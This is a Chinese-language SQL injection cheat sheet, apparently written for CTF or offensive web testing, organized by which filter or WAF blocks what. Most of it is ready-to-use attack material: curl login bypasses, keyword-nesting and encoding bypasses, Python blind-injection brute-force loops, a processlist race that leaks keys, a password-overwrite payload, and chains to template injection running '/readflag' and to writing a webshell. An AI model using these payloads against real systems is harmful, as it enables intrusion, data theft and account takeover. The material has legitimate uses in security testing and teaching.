---
title: SQL 注入全手法（判据优先）
phase: webapp
vuln_class: [sqli, injection]
summary: 按「WAF/过滤挡住了什么」选绕过手法：引号被转义、关键字被删、比较符被禁、information_schema 被拦、无回显、无 SLEEP。每类给判据与对应打法，含二阶注入、跨字段拆包、编码层绕过。
---

# SQL 注入全手法（按「什么被挡住」索引）

**用法**：先确定注入点，再看**过滤挡住了什么**，直接跳到对应小节。不要从第一条读到最后一条。
拿不到注入点先看 `web/漏洞分类/SQL注入/注入类漏洞（SQL注入-命令注入-SSTI）.md`（探测与确认）；本文只讲**确认注入之后的绕过与取数**。

## 0. 判据速查表

| 现象                         | 说明什么                  | 去哪节          |
| -------------------------- | --------------------- | ------------ |
| 单引号被反斜杠吃掉、回显报错消失           | 转义函数在工作，但可能编码层不匹配     | §2 编码层绕过     |
| `union`/`select` 打进去无反应    | 关键字被过滤/删除             | §3 关键字绕过     |
| 数字和 `= < >` 都被过滤           | 比较符黑名单                | §4 比较符绕过     |
| `information_schema` 报错或空  | 元数据表被 WAF 拦           | §5 元数据替代源    |
| 有注入但页面无任何差异                | 盲注，需构造 oracle         | §6 盲注 oracle |
| 注入了但查不到表名/列名               | 只能 INSERT 无 SELECT 权限 | §7 写侧利用      |
| 参数本身干净，但页面读的是别处存的值         | 二阶注入                  | §8 二阶注入      |
| 单字段过滤严格，同一条 SQL 拼接了多个字段    | 跨字段拆包                 | §9 跨字段拆包     |
| 输入经过 XML/JSON/EXIF/QR 等中间层 | 中间层解码后才进 SQL          | §10 非表单入口    |

## 1. 引号与转义的第一层绕过

**判据**：`'` 被转成 `\'`，但 `\` 本身没被过滤。

后端 `WHERE name='$u'`，传入 `\` 时变成 `WHERE name='\'`——反斜杠把闭合引号吃掉了，后面的 `AND password=` 变成字符串的一部分。

```bash
# 用户名填一个反斜杠，密码位置注入
curl -X POST http://target/login -d 'username=\&password= OR 1=1-- '
curl -X POST http://target/login -d 'username=\&password=UNION SELECT value,2 FROM flag-- '
```

**要点**：反斜杠绕过只在**转义层和拼接层对不齐**时成立。现代框架的参数化查询完全免疫，别浪费轮次。

## 2. 编码层绕过（多字节 / 字符集不匹配）

**判据**：应用用了 `addslashes` 或自定义转义，且数据库字符集不是 UTF-8。

### 2.1 多字节尾字节吃掉反斜杠

Shift-JIS / GBK / EUC-JP 里存在**尾字节为 `0x5c`（反斜杠）** 的双字节字符（如 Shift-JIS 的 `ソ` 是 `0x83 0x5c`）。转义函数在 `ソ` 后加 `\`，得到 `0x83 0x5c 0x5c`，被数据库解析成「`ソ` + `\`」——**引号没被转义**。

```javascript
// Shift-JIS 环境：\u00a5 在该字符集下映射到 0x5c
socket.send('{"type":"get_answer","answer":"\\u00a5\\" OR 1=1 -- "}')
```

**判据补充**：响应头 `Content-Type` 里的 charset、页面 meta、`SET NAMES` 语句、数据库版本（老 MySQL 默认 latin1）。

### 2.2 十六进制代替字面量

关键字或引号被拦时，把字符串整体换成 `0x...`，数据库会当字符串处理：

```sql
SELECT 0x6d656f77;              -- 返回 'meow'，不出现任何引号
-- 配合 UNION，把 SSTI payload 也塞进去：
username=asd\&password=) union select 1, 0x7b7b73656c662e5f5f696e69745f5f7d7d#
```

### 2.3 正则锚点被 Unicode 全角字符废掉

**判据**：过滤用 `preg_match('/^\d+$/', ...)` 之类，但源码里那个 `$` 是**全角** `＄`（U+FF04）。

PCRE 把全角 `＄` 当普通字面量，**没有行尾锚定**，所以 `1337` 后面跟任意垃圾都能通过校验。

```php
// 有洞的写法（注意是全角＄）
if (preg_match('/^\d+＄/', $input)) { /* 放行 */ }
```

**纪律**：审正则先 `hexdump -C` 确认锚点字符的码位。`$ ^ . [ ] * + ? ( )` 的全角版本在 PCRE 里全是普通字符，会把过滤降级成「前缀匹配」。

## 3. 关键字被过滤/删除

### 3.1 单次删除 → 自我嵌套

**判据**：过滤是**单次** `str_replace` / 单次正则替换，不是循环直到不再变化。

把关键字嵌进自身，删一次后剩下的正好还原：

| 被拦 | 绕过写法 |
|---|---|
| `select` | `sselectelect`、`seLselectECT` |
| `union` | `ununionion` |
| `from` | `frofromm` |
| `where` | `whewherere` |
| `load_file` | `load_load_filefile` |
| `and` | `aandnd` |
| `or` | `oorr` |

```sql
), ((selselectect * frofromm (seselectlect load_load_filefile('/flag')) as a limit 0, 1), '2') #
```

**先测一遍**：同一关键字发两遍，看第二遍是否仍被拦——区分「删一次」和「循环删」。

### 3.2 空格被过滤

**判据**：空格被拦，但注释符/控制字符没拦。

| 替代 | 写法 |
|---|---|
| 注释 | `UNION/**/SELECT` |
| 括号 | `UNION(SELECT(1),2)` |
| 制表/换行 | `%09`、`%0a`、`%0c` |
| 反引号包标识符 | `` `user` `` 与 `/**/` 混用 |
| 版本注释 | `/*!50000UNION*/` |

### 3.3 黑名单按「空格分隔」匹配

**判据**：过滤在找 `" UNION "`（带前后空格），而不是 `UNION`。

SQL 词法器把**闭合引号当词边界**，所以 `'UNION` 依然是关键字：

```sql
aggies' UNION SELECT 1; #   -- 被拦（过滤看到 " UNION "）
aggies'UNION SELECT 1; #    -- 通过（引号紧贴 UNION）
'UNION SELECT @@VERSION #
```

同类：`UNION/**/SELECT`、`UNION%0aSELECT`、`UNION(SELECT ...)`。

## 4. 比较符与数字被禁用

### 4.1 `BETWEEN` 恒真

**判据**：`= < >` 和数字字面量都在黑名单里，但 `BETWEEN` 没被拦。

`id BETWEEN id AND id` 语义上恒真（`id <= id AND id >= id`），且两端都是**列引用**不是字面量，绕开数字过滤。

```sql
' OR id BETWEEN id AND id UNION SELECT flag,2,3 FROM flags--
-- 连 UNION 都被拦时，退化成条件盲注：
id BETWEEN id AND id AND (SELECT SUBSTR(flag,1,1) FROM flags) BETWEEN 'a' AND 'z'
```

### 4.2 `REGEXP` 逐字节 oracle

**判据**：`and`/`if`/`substring`/`concat`/`sleep` 全被拦，但 `REGEXP` 没在词表里。

`REGEXP` 支持锚点 `^`，可以用「正则前缀逐步加长」当布尔 oracle，完全不需要 `AND`/`IF`/`SUBSTRING`：

```python
prefix = ""
while True:
    for c in string.ascii_letters + string.digits + "{}_":
        pw = f"`||pw/**/REGEXP/**/\"^{prefix+c}\";\x00"
        r = requests.get(URL, params={"user": "`\\`", "pw": pw})
        if "Welcome" in r.text:
            prefix += c
            break
    else:
        break
```

**三个要点**：
- 反引号包列名 + `/**/` 当空格，绕开空格剥离；
- 结尾 `\x00` 在老 PHP+MySQL 组合里会**截断 SQL 字符串**，把尾部残留引号丢掉；
- 不需要 `SUBSTRING`，因为正则本身就是「前缀匹配」。

## 5. `information_schema` 被拦时的元数据来源

| 来源 | 能拿到 | 条件 |
|---|---|---|
| `mysql.innodb_table_stats` | `database_name`、`table_name` | InnoDB，无需特权 |
| `mysql.innodb_index_stats` | 上述 + `index_name` | InnoDB |
| `sys.schema_table_statistics` | `table_schema`、`table_name` | MySQL 5.7+ |
| `sys.x$schema_table_statistics` | 同上，少格式化 | MySQL 5.7+ |
| `PROCEDURE ANALYSE()` | 列名（全限定 `db.table.column`）、min/max、建议类型 | 老 MySQL（5.7 后移除） |
| `sqlite_master` | `type`/`name`/`tbl_name`/`sql` | SQLite |

```sql
SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database()
SELECT * FROM users PROCEDURE ANALYSE()--     -- 输出 Field_name / Min_value / Optimal_fieldtype
SELECT sql FROM sqlite_master WHERE tbl_name='nxf8_users' AND type='table'
```

**注意**：`innodb_table_stats` 只有表名**没有列名**，找到表之后必须再上盲注或报错注入取列。

## 6. 盲注 oracle 的构造

### 6.1 无 `SLEEP()` 的库

**判据**：报错是 `unrecognized token`（SQLite）或确认是 SQLite。

SQLite 没有 `SLEEP`。用 `randomblob(N)` 生成大块随机数据制造延迟，`N` 越大越慢：

```sql
admin' and 1=randomblob(300000000)--
admin' and password like 'f%' and 1=randomblob(300000000)--
```

```python
for pos in range(32):
    for c in string.ascii_lowercase + string.digits + "_{}":
        payload = f"admin' and password like '{known}{c}%' and 1=randomblob(300000000)--"
        t0 = time.time(); requests.post(url, data={"username": payload, "password": "x"})
        if time.time() - t0 > 2.0:
            known += c; break
```

其他 SQLite 延迟原语：`zeroblob()`、递归 CTE。`randomblob` 最稳。

### 6.2 `LIKE` 逐字符爆破

最简单的一类：oracle 直接是「条件真假反映在页面差异上」，用 `LIKE 'prefix%'` 累加：

```python
password = ""
for pos in range(length):
    for c in string.printable:
        if oracle(f"' OR password LIKE '{password}{c}%' --"):
            password += c; break
```

### 6.3 同一参数被两条 SQL 各用一次

**判据**：同一个注入点在同一次请求里被拼进两条语句（如「先查权限，再写日志」）。

用 MySQL 会话变量做出「第一次求值返 A、第二次返 B」的效果：

```sql
case when @w is null then @w:=2 else @w:=@w-1 end
-- 完整注入（第一条要 role=2 才算 admin，第二条要 action=1 才不告警）
' OR role = (case when @w is null then @w:=2 else @w:=@w-1 end) --
```

**原理**：`@w` 在同一连接内跨语句存活，`CASE WHEN @w IS NULL` 在首次使用时初始化，后续求值递减。一个注入点同时满足两条语句的不同条件。

### 6.4 从 `processlist` 偷并发查询里的秘密

**判据**：注入点能读 `information_schema.processlist`，且应用里有「解密/校验」这类必然带密钥的查询。

`processlist.INFO` 是**当前正在执行**的完整 SQL 文本。一边触发带密钥的查询，一边并发读 `processlist`，就能抓到只在执行瞬间可见的密钥：

```sql
union select 1,(select INFO from information_schema.processlist
  where INFO like 0x256465637279707425),3,4 from board
-- 0x256465637279707425 = '%decrypt%'
```

```python
for _ in range(100):
    threading.Thread(target=trigger_sensitive_query).start()   # /decrypt?data=...
    threading.Thread(target=leak_processlist).start()
```

**要点**：这是**竞态**，命中率靠并发堆；把 `LIKE` 的特征词换成目标查询里必然出现的片段。

### 6.5 PHP PCRE 回溯上限当绕过

**判据**：过滤是 PHP `preg_match`，且写法是 `if (!preg_match(...))`。

`pcre.backtrack_limit` 默认 100 万。输入超长时 `preg_match` **返回 `false`（出错）而不是 `0`（不匹配）**，而 `!false === true`——WAF 以为「没匹配」直接放行：

```python
payload = "union select 1,2,3-- " + "a" * 1000001
```

**判据补充**：任何用 `!preg_match()` 松比较的 PHP 过滤都吃这招；正确写法是 `preg_match(...) === 0`。

## 7. 只有 INSERT 权限时的写侧利用

**判据**：能注入 INSERT，但 `SELECT` 被拒（UNION 取数全空/报权限错）。

MySQL 的 `ON DUPLICATE KEY UPDATE` 在插入撞 UNIQUE 约束时**改为更新已有行**，于是可以在没有 SELECT 权限的情况下改掉别人的密码：

```sql
INSERT INTO users (id, username, password) VALUES ('', '<注入>', 'x')
-- 注入内容：
'),('','root','z')ON DUPLICATE KEY UPDATE password='l'#
-- 展开后：插入 root，撞 UNIQUE → 把已有 root 的 password 改成 'l'
```

**同类判据**：注册/建号接口的 INSERT 可注入；数据库账号只有 INSERT/UPDATE 无 SELECT。

## 8. 二阶注入

**判据**：输入在写入时被安全转义（参数化），但**读回来之后**又拼进了新查询。

```python
# 第一步：存进去（这一步是安全的，会被转义）
s.post("/register", data={"username": "admin'-- -", "password": "anything"})

# 第二步：触发——从库里取出 username，未转义地拼进 UPDATE
s.post("/change-password", data={"old_password": "anything", "new_password": "hacked"})
# UPDATE users SET password='hacked' WHERE username='admin'-- -'
```

**找点顺序**：注册 → 改密/改资料 → 用存量值搜索 → 后台导出 → 任何「把用户存过的值读回来再查一次」的功能。存储型 XSS 的找法在这里同样适用，区别是汇点换成了 SQL。

## 9. 跨字段拆包

**判据**：过滤**逐字段**检查，但多个字段被拼进同一条 SQL。

MySQL 的 `/* */` 跨字符串边界生效。把注释开头放一个字段、结尾放另一个字段，任何单字段过滤都看不到完整 payload：

```text
username = '/*
password = */ OR 1=1 --
-- MySQL 看到：WHERE name='/*' AND password='*/ OR 1=1 -- '
-- 注释剥离后：WHERE name=' OR 1=1 -- '
```

**变体**：把 `UNION` 拆到两个参数、把引号拆到两个字段。

## 10. 非表单入口（中间层解码后才进 SQL）

**判据**：表单字段过滤很严，但应用还接受别的输入形态。

| 入口 | 机制 | 打法 |
|---|---|---|
| XML 请求体 | WAF 看原始字节，XML 解析器先解实体 | 关键字写成 `&#x55;&#x4e;&#x49;&#x4f;&#x4e;`（`UNION`） |
| 图片 EXIF | 元数据直接入库，WAF 不查二进制 | `exiftool -Comment="' UNION SELECT password FROM users--" a.jpg` |
| XMP | 同上，且常被应用主动解析 | `exiftool -XMP-dc:Description="' UNION SELECT 1,2,3--" a.jpg` |
| 二维码 | 解码结果被信任为「安全输入」 | 生成含 payload 的 QR，空格用 `\t` 代替 |
| HTTP 头 | 被写入日志表/虚拟主机解析 | `Host:`、`X-Forwarded-For:`、`User-Agent:`、`Referer:` |
| LDAP 过滤器 | 前缀布尔树，`)(` 可重平衡 | `*))(|(uid=*` |

**XML 实体编码表**：

| 关键字 | XML 十六进制实体 |
|---|---|
| `UNION` | `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` |
| `SELECT` | `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;` |
| `FROM` | `&#x46;&#x52;&#x4f;&#x4d;` |
| `WHERE` | `&#x57;&#x48;&#x45;&#x52;&#x45;` |

**sqlmap**：用 `hexentities` tamper；若实体被二次编码成 `&amp;`，改 `sqlmap/lib/request/connect.py`。

**LDAP 要点**：过滤器是 `&`/`|`/`!` + 括号子树。未转义的 `)`、`(`、`*`、`\` 都能重平衡这棵树。常见 payload：`*)(uid=*`（OR 通配）、`*))(&(1=1)`（强制真）、`foo)(|(password=*)`（枚举记录）。服务端转义应为 `\28` `\29` `\2a` `\5c`。

## 11. `ORDER BY` / 排序列注入

**判据**：接口接受 `sort` / `order_by` / `tbl_sort` 这类参数，且值直接进了 `ORDER BY`。

参数化查询**管不了**列名和排序方向（它们是标识符不是值），所以 ORM 的 `order_by($key)` 是常见盲区：

```http
POST /cp/tbl_sort[0][]=(select if(substr(user_password,1,1)='a',sleep(5),0) from exp_members) tbl_sort[0][]=ASC
```

**要点**：`ORDER BY` 子查询极少被 WAF 覆盖（WAF 盯 `SELECT`/`UNION`），是绕 WAF 的好位置。方向参数同样可注入。

## 12. SQLi → 其他漏洞的链

**判据**：注入能取数，但取到的值会被二次渲染/二次执行。

| 链 | 触发条件 | 做法 |
|---|---|---|
| SQLi → SSTI | 取出的值进模板渲染 | payload 转十六进制塞进 UNION 结果，如 `{{self.__init__.__globals__.__builtin__.__import__('os').popen('/readflag').read()}}` |
| SQLi → 文件读 | MySQL 有 `FILE` 权限且 `secure_file_priv` 为空 | `load_file('/flag')`、`INTO OUTFILE` 写 webshell |
| SQLi → 反序列化 | 取出的值被 `unserialize` | 把序列化 payload 存进库，等应用读出反序列化 |

## 13. 纪律

- **参数化查询免疫上面绝大多数手法**。看到 PDO/prepared statement 就别试引号绕过了，直接找二阶注入或 `ORDER BY` 注入。
- **先确认注入再绕 WAF**。没有注入点的情况下堆 payload 是浪费轮次。
- **每个绕过手法都有明确判据**。判据不成立就别试——比如字符集是 UTF-8 时不要试 Shift-JIS 绕过。
- **报错信息是最好的信息源**。`unrecognized token` 直接告诉你数据库是 SQLite；`You have an error in your SQL syntax` 说明 MySQL 且报错没关。
